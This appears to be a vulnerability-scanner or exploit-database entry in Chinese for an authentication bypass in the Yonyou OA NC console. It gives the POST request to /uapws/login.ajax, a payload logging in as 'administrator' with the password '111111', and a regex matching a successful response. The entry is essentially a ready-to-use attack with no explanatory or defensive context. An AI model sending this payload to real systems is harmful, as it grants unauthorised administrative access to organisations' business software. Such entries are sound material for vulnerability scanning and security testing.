# 用友OAnc控制台绕过漏洞

用友 ｜ 其他 ｜ —
- **请求**：`POST /uapws/login.ajax HTTP/1.1`

**Payload**
```
name=administrator&password=111111
```
- **响应特征**：200 ^(?=.*?(?:0|1)).*?$